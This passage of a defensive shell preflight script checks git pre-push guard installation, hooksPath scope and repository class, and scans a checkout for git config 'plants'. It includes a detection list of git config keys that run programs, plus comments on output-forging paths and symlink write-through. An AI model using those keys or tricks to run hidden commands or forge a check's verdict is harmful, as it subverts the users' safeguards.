  # there. The tree is judged normally, exactly as the no-op case is (H2's reasoning, a second value).
  # `guard_hookspath_is_noop`'s SIBLING, deliberately separate rather than a widened noop: the two
  # answer different questions ("is this the default .git/hooks?" vs "is this the tracked hooks/?"),
  # they print different things at the call site, and folding them would make one predicate's kill
  # decision cover the other's.
  # RESOLUTION RULE, same as the sibling's: a RELATIVE value resolves against the WORKTREE TOP-LEVEL
  # (measured, git 2.48.1). No main-worktree retry is needed here and none is added: attempt 1 uses
  # guard_resolve, which is existence-independent for the LAST component, so it resolves from a linked
  # worktree too — and in a linked worktree `<wt>/hooks` is exactly the right answer, since that
  # checkout has its own hooks/ and its own HEAD (the same reason guard-wired.sh judges the pair
  # there). Locked by leg H6.
  _ht_top=$(git rev-parse --show-toplevel 2>/dev/null) || return 1
  [ -n "$_ht_top" ] || return 1
  _ht_want=$(guard_resolve "$_ht_top/hooks") || _ht_want=""
  case "$1" in
    /*) _ht_abs=$(guard_resolve "$1") || _ht_abs="" ;;
    *)  _ht_abs=$(guard_resolve "$_ht_top/$1") || _ht_abs="" ;;
  esac
  [ -n "$_ht_abs" ] && [ -n "$_ht_want" ] && [ "$_ht_abs" = "$_ht_want" ]
}

check_guard_installed() {
  [ "$(guard_tree_class)" = incepted ] || return 0     # N/A: silent, no output (anti-wolf)
  # --git-path, not a hardcoded .git/hooks/ — the two diverge under a linked worktree (measured on git
  # 2.48.1: from a linked worktree --git-path yields the SHARED <main>/.git/hooks/pre-push, because hooks
  # live in the common dir, while the worktree's own .git is a FILE — so the hardcoded form reports a
  # FALSE MISS on a correctly guarded tree). incept.sh:951 already uses this form; inception-done.sh did
  # NOT when this was written (re-checked 2026-08-15: its own hook-lookup leg now does), and that weaker
  # convention is not propagated here. Locked by legs W1/W2.
  GUARD_HOOK=$(git rev-parse --git-path hooks/pre-push 2>/dev/null) || return 0
  [ -n "$GUARD_HOOK" ] || return 0
  # --git-path answers RELATIVE TO THE CWD (measured, git 2.48.1: from <repo>/a/b it yields
  # ../../.git/hooks/pre-push). Detection is unaffected, but the refusal block in the main body — grep
  # `if [ "$GUARD_REFUSE" -eq 1 ]`, the durable anchor; NO LINE NUMBER, because it drifts and did (the
  # T2 fix-loop's own edits moved it, and a stale number here is this file's recurring failure) — prints a
  # `cp "<src>" "$GUARD_HOOK"` line the reader is meant to PASTE (design §4.5) — and a cwd-relative path
  # in that line is a broken command anywhere but the dir preflight happened to run in. Absolutize ONCE,
  # here, so the message, the refusal and the hooksPath comparison below all see a single canonical
  # form. (Until T2 wired the call site and that block this sentence described a refusal that did not
  # exist — the comment was written in the present tense against unbuilt code, which is this file's own
  # recurring failure: a comment standing in for execution. It is now true.) The refusal
  # absolutizes the SOURCE half of that command by the same route, for the same reason. Locked by leg
  # W3 at the function level and by legs MP1/MP5 through the real run.
  # NOT `--path-format=absolute`: that flag landed in git 2.31, and this script's git floor (:36-37) is
  # a WARN-AND-DEGRADE floor, not a hard requirement — an older git must still get a correct answer, not
  # an "unknown option" error. `cd` + `pwd -P` is version-agnostic.
  case "$GUARD_HOOK" in
    /*) : ;;
    *)  # The parent dir may not exist (e.g. a --git-dir pointing at a pruned tree). Leaving GUARD_HOOK
        # relative there is strictly no worse than before, and the failure must NOT abort under `set -e`
        # — hence the `if`, not a trailing `[ … ] && …` (whose non-zero status would kill the run).
        # guard_resolve_DEEP, not guard_resolve: this path is printed into a command a human PASTES, so
        # it must come out absolute even when `.git/hooks` itself is missing (an empty --template). The
        # shallow form leaves it relative there, which the Y1 fix made reachable — see that helper's
        # note for why the hooksPath comparison must keep the shallow one. Locked by leg MP12.
        _gh_abs=$(guard_resolve_deep "$GUARD_HOOK") || _gh_abs=""
        if [ -n "$_gh_abs" ]; then GUARD_HOOK="$_gh_abs"; fi ;;
  esac
  # HOSTILE PATH => REFUSE WITHOUT PRINTING IT (Rule 2 / finding X3b). Every line below names a path,
  # and a path carrying a real newline forges whole lines into this check's verdict — measured, it
  # forged a complete `cp … && chmod +x …` block INSIDE the branch whose purpose is to refuse one. The
  # only sound answer is to not print it: the verdict says WHAT is wrong and never echoes the value.
  # FAIL-CLOSED, not silent — going quiet here would hand an attacker a way to switch the check OFF by
  # naming a directory, which is strictly worse than the forgery. Locked by legs E2/E3.
  if guard_path_hostile "$GUARD_HOOK"; then
    echo "Runtime guard:"
    echo "  MISS pre-push guard — this repository's path contains a CONTROL CHARACTER"
    GUARD_STATE=hostile-path; GUARD_REFUSE=1
    return 0
  fi
  # core.hooksPath REDIRECTS git's hook lookup. An earlier revision of this comment claimed, as
  # "measured", that `git rev-parse --git-path hooks/…` does NOT honour it. THAT WAS WRONG — re-measured
  # 2026-07-21 on git 2.48.1, --git-path IS hooksPath-aware (see guard_hookspath_is_noop). The old claim
  # survived only because the skip used to run BEFORE the rev-parse, so nothing ever observed it; M2's
  # reordering is what exposed it. The DECISION is unchanged and does not rest on the wrong premise: a
  # husky/lefthook adopter — brownfield is a supported lane, docs/adoption/brownfield.md — owns that
  # hooks dir, and the kit deliberately does not reach into it, install into it, or pass judgment on
  # what another tool put there. So: DISCLOSED SKIP, arming nothing. A wrong refusal on a legitimate
  # setup is the cry-wolf failure doctor.sh:18 warns about.
  # But SET is not REDIRECTS: core.hooksPath=.git/hooks is a no-op some tooling writes, and skipping
  # there would go silent on exactly the unguarded state K11 exists to catch. So the skip is conditioned
  # on guard_hookspath_is_noop — which is a NAMING test, not a "does it differ" test, and the difference
  # matters: the value is judged a no-op when it NAMES the repo's default hooks dir against either the
  # current worktree's top-level or the main worktree's (see that function's TWO ROOTS note). From a
  # linked worktree `.git/hooks` does not resolve at all against the first root and git in fact runs
  # NOTHING there — but it still names no other tool's hooks dir, so it is judged, not skipped. An
  # earlier revision of this comment claimed the skip was conditioned on the dirs "actually DIFFERING";
  # that OVERSTATED the code, which skipped from a linked worktree on a value that differs from nothing.
  # Locked by legs H1 (a real redirect skips), H2 (the no-op setting is judged normally from the main
  # tree) and H3 (the identical config is judged the SAME way from a linked worktree).
  # SCOPE IS PART OF THE VERDICT (finding X4). `git config --get` reads local, global AND system scope,
  # but the message this stanza used to print said "this repo manages its own hooks" — a statement about
  # the REPO, made from a value that may have come from `~/.gitconfig`. MEASURED (2026-07-21): one line
  # in a global config (common with husky, lefthook and corporate setups) made K11 silent and green in
  # EVERY incepted repo on the machine, saying the repo manages hooks it never asked to manage. The
  # deference the skip exists to grant is owed to a repo that opted in — a machine-wide default is not
  # that opt-in, and it is exactly the fleet-wide silence this slice exists to remove.
  # `--local --get` is the version-agnostic scope test (measured: rc 1 + empty when the value is
  # global-only, the value itself when the repo set it); `--show-scope` would be cleaner but landed in
  # git 2.26 and this script's git floor is WARN-AND-DEGRADE, not a requirement.
  # Locked by legs H1 (local scope keeps the deferential wording) and H5 (a non-local scope WARNS).
  _hp=$(git config --get core.hooksPath 2>/dev/null) || _hp=""
  _hp_local=$(git config --local --get core.hooksPath 2>/dev/null) || _hp_local=""
  if [ -n "$_hp" ] && guard_path_hostile "$_hp"; then
    # Rule 2 applied to the CONFIG VALUE as well as to the path. This closes E1's disclosed residual:
    # git un-escapes `"a\nb"` in a quoted config value into a REAL newline, which `printf '%s\n'`
    # passes straight through and which the old comment recorded as unfixable-from-here. It is not
    # unfixable; it is the same parse-time rejection, applied to the second input. Locked by leg E3.
    echo "Runtime guard:"
    echo "  MISS pre-push guard — core.hooksPath contains a CONTROL CHARACTER; refusing to echo it"
    GUARD_STATE=hostile-path; GUARD_REFUSE=1
    return 0
  fi
  # THREE VALUES REACH HERE, NOT TWO (HOOK-INSTALL-RECURS-PER-SLICE, review round 1): the default hooks
  # dir (a no-op — judged normally, leg H2), the repo's own TRACKED hooks/ dir (the kit's documented
  # second install — also judged normally, leg H6, because the kit's hook is committed there and no
  # other tool owns it), and anything else (a genuine foreign redirect — the disclosed skip, leg H1).
  if [ -n "$_hp" ] && ! guard_hookspath_is_noop "$_hp" && ! guard_hookspath_is_tracked_dir "$_hp"; then
    # printf with the config value as an ARGUMENT to %s, never inside the format string: dash's builtin
    # `echo` expands backslash escapes, so a core.hooksPath containing a literal `\n` could synthesise
    # an extra line into a security check's verdict. Locked by leg E1 (which also records why the
    # mutation kill is shell-dependent while the assertion is not). A security fix with no leg is a
    # claim, not a control.
    echo "Runtime guard:"
    if [ "$_hp_local" = "$_hp" ]; then
      printf '%s\n' "  skip pre-push guard — core.hooksPath is set to '$_hp'; this repo manages its own hooks."
      printf '%s\n' "       The kit is NOT judging $_hp/pre-push. Install the guard there yourself if you want it."
    else
      # NOT the reassuring per-repo wording, and not silence either. The operator is told the truth:
      # nothing in this repository asked for a redirect, the kit's guard is not in force here, and the
      # setting that silenced the judgment lives somewhere else on this machine. Advisory (`rec`), not
      # a refusal — a global hooksPath is a legitimate configuration and refusing on it would be the
      # cry-wolf failure doctor.sh:18 warns about; but a green that says nothing is what X4 measured.
      printf '%s\n' "  warn pre-push guard NOT IN FORCE — a core.hooksPath set OUTSIDE this repository"
      printf '%s\n' "       (global or system scope, not .git/config) redirects hooks to '$_hp'."
      printf '%s\n' "       Nothing in THIS repository asked for that, and the kit's guard is not running."
      printf '%s\n' "       Unset it, set a repo-local core.hooksPath, or install the guard at $_hp/pre-push."
      rec=$((rec + 1))
    fi
    return 0
  fi
  echo "Runtime guard:"
  if [ -h "$GUARD_HOOK" ] && [ ! -e "$GUARD_HOOK" ]; then
    # DANGLING SYMLINK IS ITS OWN STATE (finding X6). `[ -f ]` FOLLOWS symlinks, so a dangling
    # `.git/hooks/pre-push -> /elsewhere` answered "absent" — and the `cp` this script then printed
    # writes THROUGH the link to the link's target and `chmod +x`s it. MEASURED (2026-07-21): pasting
    # the emitted fix created an executable file at an attacker-chosen path outside the repo.
    # The precondition is local write access to `.git/`, so this is hardening rather than a live
    # attack — but "absent" is the wrong ANSWER regardless, and the fix for it (`cp`) is the wrong
    # FIX: removing the link is. A `-h` test before `-f` is the whole change. Locked by leg D1.
    printf '%s\n' "  MISS pre-push guard — $GUARD_HOOK is a DANGLING SYMLINK (a cp here would write through it)"
    GUARD_STATE=dangling; GUARD_REFUSE=1
  elif [ ! -f "$GUARD_HOOK" ]; then
    # printf '%s\n', NOT echo — this was the ONE variable-interpolating `echo` left in the new code,
    # in direct contradiction of the rule this file states at the refusal block ("printf '%s\n' — not
    # echo — for every line carrying a path"). MEASURED under /bin/dash, which IS /bin/sh on the
    # ubuntu-latest runner that executes this in CI: a directory named `e\nok   pre-push guard
    # installed and executable\n` made this line print a forged `ok` verdict. The rule was already
    # written; it had simply been applied to one of its two instances. Locked by leg E2.
    printf '%s\n' "  MISS pre-push guard — not installed at $GUARD_HOOK"
    GUARD_STATE=absent; GUARD_REFUSE=1
  elif [ ! -r "$GUARD_HOOK" ]; then
    # UNREADABLE must be its own state, checked BEFORE the marker grep. `grep -q … 2>/dev/null` cannot
    # tell "no marker" from "cannot read", so an unreadable hook that DOES carry KIT_GUARD_CORE would
    # fall through to the foreign branch and be affirmatively mislabelled "foreign hook preserved" while
    # arming nothing — fail-open behind a reassuring message. Design §8 claims absent, inert, OR
    # UNREADABLE refuses, so the code moves to the design rather than the design to the code.
    # ACCEPTED COST, disclosed not accidental: because this branch precedes the marker grep, a FOREIGN
    # hook that happens to be unreadable is ALSO refused — a brownfield hook with restrictive
    # permissions is punished, which §4.3 ("a foreign hook is never punished") otherwise forbids. That
    # is deliberate and unavoidable in this order: unreadable cannot be distinguished from unmarked, so
    # the only alternative is to call an unverifiable hook foreign — which is precisely the fail-open
    # this branch exists to close. Refusing (recoverable: `chmod +r`) beats reassuring (silent).
    # DISCLOSED DIVERGENCE: inception-done.sh:71 has the identical hole; repairing it is a follow-up row
    # (design §10 already carries its sibling, the :68 hardcoded-path row) and is NOT done from here.
    echo "  MISS pre-push guard present but UNREADABLE — cannot verify it is the kit's"
    GUARD_STATE=unreadable; GUARD_REFUSE=1
  elif ! guard_is_kit_hook "$GUARD_HOOK"; then
    # A foreign hook is never punished (§4.3) — but if it is not executable then git runs NOTHING on
    # push, and wording that implies a hook is in force would be a false reassurance. Say what is true.
    if [ -x "$GUARD_HOOK" ]; then
      echo "  ok   pre-push hook present but not the kit's (foreign hook preserved — brownfield)"
    else
      echo "  ok   pre-push hook present but not the kit's, and not executable — nothing runs on push; the kit does not manage it"
    fi
  elif [ ! -x "$GUARD_HOOK" ]; then
    echo "  MISS pre-push guard present but not executable — git silently ignores it"
    GUARD_STATE=inert; GUARD_REFUSE=1
  else
    echo "  ok   pre-push guard installed and executable"
    # THE CEILING BELONGS ON THE HAPPY PATH TOO (finding J5). Until now only the REFUSED operator was
    # told this hook is a speed bump — and the operator who sees `ok` is the one most likely to read it
    # as "main is protected", which it is not: the solo enforce_admins:false bypass is server-side and
    # `--no-verify` skips the hook outright. One line, deliberately: the happy path must not be bloated,
    # and the full statement is one `cat` away at the doc named here.
    echo "       (a SPEED BUMP, not a boundary — --no-verify skips it and the server-side solo-admin bypass remains; docs/enterprise/platform-safety-boundary.md)"
  fi
  # M-1 — THE HOOKS DIRECTORY ITSELF ESCAPED. Deliberately AFTER the cascade and CONDITIONED ON A
  # REFUSAL ALREADY BEING ARMED, rather than being a branch of its own at the top. The reason is the
  # cry-wolf rule this file keeps applying: a `.git/hooks -> /shared/git-hooks` symlink is a real
  # (if unusual) setup, and if the kit's guard IS installed and executable there then git RUNS it and the
  # tree is genuinely guarded — an `ok` verdict is TRUE and converting it into a MISS would punish a
  # working configuration. What the escape actually breaks is the FIX: every command the refusal block
  # offers (`cp`, `chmod +x`, `rm`) would act on a file outside this repository's git dir. So the escape
  # re-labels the states that emit a command and touches nothing else. All four are covered, not just the
  # `absent` one that was reported — `dangling`'s `rm`, `inert`'s `chmod +x` and `unreadable`'s `chmod +r`
  # name the same escaped path. `hostile-path` cannot reach here (it returns above) and must not: its
  # whole contract is that no path is examined or printed.
  # BOTH HALVES MEASURED (2026-07-21), not reasoned — the placement argument above is exactly the kind of
  # claim this file keeps finding stated and unchecked:
  #   `.git/hooks -> <outside>` + the kit guard installed and executable there
  #        -> `ok   pre-push guard installed and executable`, rc 0. No wolf; git really does run it.
  #   same, but the hook there is INERT     -> hooks-escape, NO `chmod +x` naming the outside path, rc 1
  #   same, but the leaf there is DANGLING  -> hooks-escape, NO `rm` naming the outside path, rc 1
  # Leg D2 locks the `absent` route; the other two share the one `case` arm D2 drives, so the arm is
  # locked and the STATES that reach it are stated here rather than each carrying a near-duplicate leg.
  if [ "$GUARD_REFUSE" -eq 1 ] && guard_hooks_dir_escapes "$GUARD_HOOK"; then
    echo "  MISS the HOOKS DIRECTORY resolves OUTSIDE this repository's git dir — no fix command can be offered"
    GUARD_STATE=hooks-escape
  fi
}

# SWAS-361 (352g F10): the guard's kill-switch exported in THIS environment is no longer silent. One FAIL line per run, naming
# what is lost. Truthiness is the guard's own (selfedit_allowed in .claude/hooks/guard-core.sh: exactly "1"); the preflight
# selftest has a coupling cell that reds if the guard's definition moves. INFORMATION ONLY: it never sets `miss`, so the exit code
# is unchanged (the file's convention: only a missing required tool or the runtime floor fails the run).
check_guard_killswitch() {
  [ "${KIT_GUARD_SELFEDIT:-0}" = "1" ] || return 0
  echo "  FAIL KIT_GUARD_SELFEDIT=1 is set in this environment — every guard refusal is OFF for this session and nothing reaches the deny log (unset it: it is a human maintenance switch, not a session setting)"
}

# SWAS-813: does a PRIVATE repository declare GitHub Enterprise Cloud? Prints declared | absent | unverifiable. The declaration is the GitHub variable KIT_ATTEST_PRIVATE (repository or
# organization level; `true` in any case). Same order and mapping as conformance/inception-done.sh (_id_attest_state): the repository variable decides when it exists, with any value;
# the organization list is read only when the repository read is a 404; a 403 or any other status is unverifiable. The read seam PREFLIGHT_GH_VAR_CMD (called with the API path as
# its last word) is honoured only under SEAMS=1, which only a flag sets (--selftest, --selftest-e2e), never the ambient environment.
repo_attest_state() {
  _rs_one="gh api"; _rs_all="gh api --paginate"
  if [ "$SEAMS" -eq 1 ] && [ -n "${PREFLIGHT_GH_VAR_CMD:-}" ]; then _rs_one=$PREFLIGHT_GH_VAR_CMD; _rs_all=$PREFLIGHT_GH_VAR_CMD; fi
  # shellcheck disable=SC2086  # deliberate: the command is a few words and must split (the seam or `gh api`)
  _rs_o=$($_rs_one "repos/{owner}/{repo}/actions/variables/KIT_ATTEST_PRIVATE" 2>&1) && _rs_c=0 || _rs_c=$?
  if [ "$_rs_c" -ne 0 ]; then
    case "$_rs_o" in *"HTTP 404"*) : ;; *) echo unverifiable; return 0 ;; esac
    # shellcheck disable=SC2086  # same as above
    _rs_o=$($_rs_all "repos/{owner}/{repo}/actions/organization-variables" 2>&1) || { echo unverifiable; return 0; }
    _rs_v=$(printf '%s' "$_rs_o" | jq -r '.variables[]? | select(.name == "KIT_ATTEST_PRIVATE") | .value' 2>/dev/null) || { echo unverifiable; return 0; }
    _rs_v=$(printf '%s\n' "$_rs_v" | head -n 1)
  else
    _rs_v=$(printf '%s' "$_rs_o" | jq -r '.value // empty' 2>/dev/null) || { echo unverifiable; return 0; }
  fi
  _rs_v=$(printf '%s' "$_rs_v" | tr '[:upper:]' '[:lower:]')
  if [ "$_rs_v" = true ]; then echo declared; else echo absent; fi
}

check_repo_class() {  # warn when the repo is PRIVATE and has not declared GitHub Enterprise Cloud (SLSA attest step(s) skip there); who owns the repo no longer decides
  if [ -z "${PREFLIGHT_GH_CMD:-}" ] && ! command -v gh >/dev/null 2>&1; then
    echo "  skip repo-class — gh not installed (cannot detect repo visibility)"; return 0
  fi
  _json=$(${PREFLIGHT_GH_CMD:-gh repo view --json isPrivate} 2>/dev/null) || _json=""
  if [ -z "$_json" ]; then
    echo "  skip repo-class — gh unavailable/unauthenticated/offline (run 'gh auth login')"; return 0
  fi
  _priv=$(printf '%s' "$_json" | jq -r '.isPrivate' 2>/dev/null || echo "")
  if [ "$_priv" = "false" ]; then
    echo "  ok   repo class supports the provenance gate (public)"
  elif [ "$_priv" = "true" ]; then
    _ra=$(repo_attest_state)   # MUT-ATTEST
    case "$_ra" in
      declared) echo "  ok   repo class supports the provenance gate (private, KIT_ATTEST_PRIVATE declared)" ;;
      absent)
        echo "  warn repo is PRIVATE and KIT_ATTEST_PRIVATE is not set — the SLSA attest step(s) will SKIP (GitHub offers attestations on a private repository only with Enterprise Cloud): make the repo public, set the KIT_ATTEST_PRIVATE variable to true if you have Enterprise Cloud, or record a dated na for gate-provenance in conformance/gate-dispositions.txt"
        rec=$((rec + 1))   # MUT-RECCOUNT
        ;;
      *) echo "  skip repo-class — could not read the KIT_ATTEST_PRIVATE variable (gh needs access to repository variables)" ;;
    esac
  else
    echo "  skip repo-class — could not parse repo metadata"
  fi
}

check_workflows_valid() {  # surface workflow validity via the existing conformance check (reuse, never reimplement)
  _cmd="${ACTIONLINT_VALID_CMD:-}"
  if [ "$_cmd" = "__skip__" ]; then
    echo "  skip workflows — actionlint-valid.sh / actionlint not available"; return 0
  fi
  if [ -z "$_cmd" ]; then
    if [ ! -f conformance/actionlint-valid.sh ]; then
      echo "  skip workflows — conformance/actionlint-valid.sh not present (pruned?)"; return 0
    fi
    if [ -z "${ACTIONLINT_BIN:-}" ] && ! command -v actionlint >/dev/null 2>&1; then
      echo "  skip workflows — actionlint not installed (set ACTIONLINT_BIN or install actionlint)"; return 0
    fi
    _cmd="sh conformance/actionlint-valid.sh"
  fi
  if $_cmd >/dev/null 2>&1; then
    echo "  ok   workflows valid (actionlint via conformance/actionlint-valid.sh)"
  else
    echo "  warn an invalid GitHub Actions workflow — run 'sh conformance/actionlint-valid.sh' for details"
    rec=$((rec + 1))
  fi
}

check_codeowners_placeholders() {  # standing re-check of @your-org placeholders (incept warns once; this re-warns any time)
  _paths="${CODEOWNERS_PATHS:-.github/CODEOWNERS .gitlab/CODEOWNERS}"
  _found=""
  _any=0
  for _co in $_paths; do
    [ -f "$_co" ] || continue
    _any=1
    if grep -q '@your-org' "$_co" 2>/dev/null; then _found="$_found $_co"; fi
  done
  [ "$_any" -eq 0 ] && return 0   # N/A — no CODEOWNERS yet (pre-inception): print nothing
  if [ -n "$_found" ]; then
    printf '%s\n' "  warn$_found still has @your-org/* placeholders — replace with real teams before enabling owner review"   # Rule 3
    rec=$((rec + 1))
  else
    echo "  ok   CODEOWNERS has no @your-org placeholders"
  fi
}

# --- C1: git's redirect files in THIS checkout, reported after the fact --------------------------------------
# PARSE-ONLY. A nested `.git` entry, `./.git/commondir`, a worktree or submodule entry that points elsewhere, an exec key in a git config, a bare layout, a pending rebase `exec`
# line and a `core.hooksPath` inside the checkout are all places where git runs something the person did not write. C1 reads the files themselves and runs no git in a nested
# directory, ever. `./.git` is judged FIRST: a gitfile, a symlink or a `commondir` is reported and then NO git runs at all, and no config is read. Files are read only when they
# are regular files and not links (`[ -f ] && [ ! -L ]`, so a FIFO named .git is reported and never opened), 4096 bytes at most. Config is read by `git config --file <f> --name-only
# --list` under `env -i`, run from `/` with no repository context and `--no-includes` (gp_cfgread), so git's early config read cannot follow an include in the unvetted file: key NAMES only, never a value (the one value read is core.hooksPath, to see whether it lies inside the checkout, and it is never printed). The index read carries
# `--git-dir=./.git`, so git never DISCOVERS a repository: a ./.git it rejects reads UNVERIFIED, and a bare layout at the root is never entered. When ./.git/config or
# config.worktree names an exec key, or a file git would open is a link or special, NO index read is made (gp_nogit). The one index read, for the registered-submodule list, is
# `gp_git ls-files --stage`; it is never `status`.
# EVERY printed name is checked first (Rule 2, Rule 3), under LC_ALL=C: a name with a non-printable or non-ASCII byte (a newline, an escape, a bidi mark) or the text `##[` is reported without
# its name, so a planted name cannot forge a line or drive a terminal. NEVER MOVES AN EXIT: it prints `warn`, `info` and `unverified` lines and returns 0, and touches none of miss, rec, bfail or bunv. SWAS-793: the main run now captures this report and counts its `  warn git-plants:` lines into gpwarn (gp_count_warns), for the summary line only: a display count, never an exit.
# TIMING, stated plainly: it runs when preflight or doctor runs; git run before that (Claude Code's own start-up git, the person's own commands) may already have run a plant, so it REPORTS,
# it does not prevent. CEILINGS: an agent can edit this script before the person runs it; the records git keeps (a worktree's gitdir file and back-link) are files an agent can forge too (see boundary_gitdir_trusted),
# so they are NOT read: a nested gitfile naming ./.git/worktrees/<one name> (by shape, never by its path name) prints an info and its own `unverified git-plants:` line (a linked worktree or a plant: this check cannot tell which), and the run never reads ok; a nested gitfile
# naming a recursive submodule's git directory prints its own `unverified` line too (its parent's index is not read); an `unverified` line prints whatever else was found; an absolute core.hooksPath is judged by a plain PREFIX against the checkout root, so one that reaches the checkout through a symlink, or
# through a case variant of the path, is missed (a value with .., //, /./ or under /proc counts as inside); the walks are unbounded (a huge tree is slow, and a permission error reads UNVERIFIED); and a file can change between the check in gp_one and the read that follows it (a same-user race, not closed).
# THE KEY LIST'S CEILING, stated: gp_exec_key is an allow-list written from memory of git's documented program-running and redirecting keys, not enumerated from git's source; a key it does not
# name is not reported, and a git newer than the list may add one. `ok` therefore means "nothing found among the keys it knows". Every file read below is read WHOLE and refused unless it is one
# plain line (gp_one), because git parses the whole file, not its first line.
gp_warn=0; gp_nogit=0; gp_unv=0; gp_cant=0; gp_recur=0; gp_root=""; gp_rootp=""; gp_out=""; gp_links=""; gp_lkfail=0; gp_hit=""; gp_1v=""
gp_nlc=$(printf '\nx'); gp_nlc=${gp_nlc%x}; gp_crc=$(printf '\r')
gp_one() {  # <file>: sets gp_1v to the file's whole content; rc 1 unless it is a regular file of at most 4096 bytes holding no NUL and exactly one non-empty line with no CR
  gp_1v=""
  { [ -f "$1" ] && [ ! -L "$1" ]; } || return 1
  gp_sz=$(wc -c < "$1" 2>/dev/null | tr -d ' ') || return 1
  case "$gp_sz" in ''|*[!0-9]*) return 1 ;; esac
  [ "$gp_sz" -le 4096 ] || return 1
  [ "$(LC_ALL=C tr -d '\000' < "$1" 2>/dev/null | wc -c | tr -d ' ')" = "$gp_sz" ] || return 1   # a NUL: the shell drops it, git stops at it, so the two would read different paths   # MUT-GPNUL
  gp_raw=$(cat "$1" 2>/dev/null; printf x) || return 1
  gp_raw=${gp_raw%x}; gp_raw=${gp_raw%"$gp_nlc"}
  case "$gp_raw" in ""|*"$gp_nlc"*|*"$gp_crc"*) return 1 ;; esac
  gp_1v=$gp_raw
}
gp_w() { gp_warn=$((gp_warn + 1)); printf '%s\n' "  warn git-plants: $1"; }   # Rule 3
gp_i() { printf '%s\n' "  info git-plants: $1"; }   # Rule 3
gp_count_warns() {  # <a check_git_plants report> -> how many findings it printed (its `  warn git-plants:` lines); SWAS-793: gp_warn lives in the report's subshell, so the main run counts the lines it printed. Display only
  _gcw=$(printf '%s\n' "$1" | grep -c '^  warn git-plants:') || _gcw=0   # MUT-GPCOUNT
  printf '%s\n' "$_gcw"
}
gp_safe() { case "$1" in *[![:print:]]*|*'##['*) return 1 ;; esac; return 0; }
gp_show() { if gp_safe "$1"; then printf '%s' "$1"; else printf '%s' '<a name it withholds (unprintable, or shaped like a credential), not shown>'; fi; }
gp_git() {  # the only git C1 runs: an explicit git directory (no discovery, so a rejected ./.git is an error and a bare layout at the root is never entered), no config but the repository's own, never a monitor, a hook, a pager, a lazy fetch or an ext:: transport
  env -i PATH="$PATH" HOME=/nonexistent GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null GIT_NO_LAZY_FETCH=1 git --git-dir=./.git -c core.fsmonitor=false -c core.hooksPath=/dev/null -c core.pager=cat -c protocol.ext.allow=never "$@"   # MUT-GPGITDIR
}
gp_cfgread() {  # <absolute config file> <git config args...>: reads ONE file from `/` with no repository context (so git's early config read cannot follow an include in the unvetted ./.git/config) and no includes; the only config reader for a candidate file
  gp_cf=$1; shift
  ( cd / && env -i PATH="$PATH" HOME=/nonexistent GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null GIT_NO_LAZY_FETCH=1 git -c core.fsmonitor=false -c core.hooksPath=/dev/null config --no-includes --file "$gp_cf" "$@" )   # MUT-GPCFGCD
}
gp_find() {  # <find predicates...>: the names found, one per line; a name with an unprintable byte is the word UNSAFE (never printed), so no name can add a line
  find -P "$@" -exec sh -c 'for gp_p; do case "$gp_p" in *[![:print:]]*|*"##["*|*:*@*) echo UNSAFE ;; *) printf "%s\n" "$gp_p" ;; esac; done' gp {} + 2>/dev/null   # MUT-GPFIND
}
gp_exec_key() {  # <lower-case key name> -> 0 when the key can run a program or pull in another file (core.hooksPath has its own check)
  case "$1" in
    core.fsmonitor|core.sshcommand|core.pager|core.editor|core.gitproxy|core.askpass|core.alternaterefscommand|core.worktree|extensions.worktreeconfig|extensions.partialclone|credential.helper|credential.*.helper|include.path|includeif.*.path|alias.*|pager.*|interactive.difffilter|diff.external|diff.*.textconv|diff.*.command|filter.*.clean|filter.*.smudge|filter.*.process|merge.*.driver|mergetool.*.cmd|mergetool.*.path|difftool.*.cmd|difftool.*.path|gpg.program|gpg.*.program|gpg.ssh.defaultkeycommand|sequence.editor|tar.*.command|sendemail.*cmd|sendemail.smtpserver|browser.*.cmd|browser.*.path|man.*.cmd|man.*.path|guitool.*.cmd|trailer.*.command|trailer.*.cmd|hook.*.command|uploadpack.packobjectshook|remote.*.vcs|remote.*.uploadpack|remote.*.receivepack|remote.*.promisor|protocol.allow|protocol.*.allow|submodule.*.update|url.*.insteadof) return 0 ;;   # MUT-GPKEY
  esac
  return 1
}
gp_cfg() {  # <absolute config file> <label> [module|wt|nested]: warn once, naming the exec keys that file sets. Without a kind it is ./.git/config or config.worktree, and a finding there stops the index read (gp_nogit). An absent file is nothing to read; a link or special file is reported, never opened; a git that fails reads UNVERIFIED
  [ "$gp_nogit" -eq 0 ] || return 0
  { [ -e "$1" ] || [ -L "$1" ]; } || return 0
  if ! { [ -f "$1" ] && [ ! -L "$1" ]; }; then gp_w "$2 is a link or not a regular file: it was not read"; return 0; fi
  gp_hit=""
  if ! gp_ck=$(gp_cfgread "$1" --name-only --list 2>/dev/null); then gp_unv=1; [ -n "${3:-}" ] || gp_nogit=1; return 0; fi   # a config git cannot parse is not vetted, and the index read would open it (and follow its includes): MUT-GPCFGFAIL
  gp_ck=$(printf '%s\n' "$gp_ck" | tr 'A-Z' 'a-z')
  while IFS= read -r gp_k; do
    [ -n "$gp_k" ] || continue
    if [ "$gp_k" = core.hookspath ] && [ -n "${3:-}" ]; then :   # git sets no hooksPath in a module, worktree-entry or nested config: any is a finding
    else gp_exec_key "$gp_k" || continue
    fi
    [ "$gp_k:${3:-}" != core.worktree:module ] || continue   # git itself sets core.worktree in every submodule's config
    case "${gp_k#*.}" in *.*) gp_k="${gp_k%%.*}.*.${gp_k##*.}" ;; esac   # a subsection can hold a credential (url.https://user:token@host/.insteadof): print section.*.variable, never the subsection (SWAS-662)   # MUT-GPMASK
    gp_safe "$gp_k" || gp_k='<unprintable key>'
    gp_hit="$gp_hit [$gp_k]"
  done <<GPEOF
$gp_ck
GPEOF
  [ -z "$gp_hit" ] && return 0
  gp_w "$2 sets key(s) that run a program or pull in another file:$gp_hit (names only; values are never read)"
  [ -n "${3:-}" ] || gp_nogit=1   # an exec key in the repository's own config: no further git, so no index read   # MUT-GPCFGSTOP
}
gp_guard_files() {  # git opens ./.git/config, config.worktree, HEAD and the index: a FIFO or a link there would hang or redirect it, so no git runs (HEAD may be a symlink: that is git's own legacy form)
  for gp_f in ./.git/config ./.git/config.worktree ./.git/index ./.git/HEAD; do
    { [ -e "$gp_f" ] || [ -L "$gp_f" ]; } || continue
    if [ "$gp_f" = ./.git/HEAD ] && [ -L "$gp_f" ]; then continue; fi
    if [ -f "$gp_f" ] && [ ! -L "$gp_f" ]; then continue; fi
    gp_w "$gp_f is a link or not a regular file: git would open it, so no git was run and no config was read"; gp_nogit=1
  done
}
gp_top() {  # ./.git first
